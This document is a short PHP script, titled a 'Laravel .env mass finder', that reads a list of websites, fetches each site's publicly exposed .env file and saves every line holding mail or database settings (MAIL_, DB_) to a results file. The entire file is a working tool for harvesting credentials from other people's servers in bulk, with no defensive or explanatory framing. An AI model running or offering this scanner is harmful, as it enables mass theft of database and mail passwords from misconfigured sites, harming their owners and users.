<?php
  set_time_limit(0);
  // Laravel .env mass finder
  function main($website){
    $path = "/" . ".env";
    global $rezFileName;
    $rezFileName = 'rezults.txt';
    $file_headers = @get_headers($website . $path);

    echo "Saved on rezults.txt</br></br>";

    if(!$file_headers || $file_headers[0] == 'HTTP/1.0 404 Not Found' || $file_headers[0] == 'HTTP/1.1 404 Not Found') {
      // $exists = false;
    } else {
      // $exists = true;
      file_put_contents($rezFileName, $website . " : " . "\n", FILE_APPEND);
      echo $website . " : " . "</br>";
      file_put_contents($rezFileName, "\n", FILE_APPEND);
      echo "</br>";
      $envContent = file_get_contents($website . $path);

      global $envLines;
      $envLines = explode("\n", $envContent);

      for ($i=0; $i<=count($envLines) - 1; $i++) {
        $find = ["MAIL_", "DB_"];
          for ($l=0; $l<=count($find) - 1; $l++) {
            if(preg_match("/{$find[$l]}/i", $envLines[$i])){
              file_put_contents($rezFileName, $envLines[$i] . "\n", FILE_APPEND);
              echo $envLines[$i] . "</br>";
          }
        }
      }
    }
  }

  $fContent = file_get_contents("liste.txt");
  $lines = explode(PHP_EOL, $fContent);

  for ($i=0; $i<=count($lines) - 1; $i++) {
    main($lines[$i]);
    file_put_contents($rezFileName, "\n", FILE_APPEND);
    echo "</br>";
  }
  file_put_contents($rezFileName, $envLines[$i] . "\n", FILE_APPEND);
  echo "</br>";
?>